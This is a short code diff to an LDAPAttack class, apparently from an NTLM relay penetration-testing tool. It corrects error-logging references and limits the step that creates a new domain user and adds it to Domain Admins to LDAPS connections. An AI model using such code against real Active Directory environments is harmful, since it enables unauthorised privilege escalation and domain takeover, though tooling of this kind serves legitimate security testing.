@@ -158,7 +158,7 @@ class LDAPAttack(Thread):
         }
         res = self.client.c.add('CN=%s,CN=Users,%s' % (new_user,dd.root),['top','person','organizationalPerson','user'],ucd)
         if not res:
-            logging.error('Failed to add a new user: %s' % str(self.c.result))
+            logging.error('Failed to add a new user: %s' % str(self.client.c.result))
         else:
             logging.info('Adding new user with username: %s and password: %s result: OK' % (new_user,new_password))
         #TODO: Fix this with localized DA group
@@ -169,7 +169,7 @@ class LDAPAttack(Thread):
             addedda = True
             thread.interrupt_main()
         else:
-            logging.error('Failed to add user to Domain Admins group: %s' % str(self.c.result))
+            logging.error('Failed to add user to Domain Admins group: %s' % str(self.client.c.result))
 
     def run(self):
         global dumpeddomain
@@ -182,7 +182,10 @@ class LDAPAttack(Thread):
         isda = self.dd.isDomainAdmin(self.username)
         if isda:
             logging.info('User is a Domain Admin!')
-            self.addDA()
+            if 'ldaps' in self.client.target:
+                self.addDA()
+            else:
+                logging.error('Connection to LDAP server does not use LDAPS, to enable adding a DA specify the target with ldaps:// instead of ldap://')
         else:
             logging.info('User is not a Domain Admin')
             if not dumpeddomain:
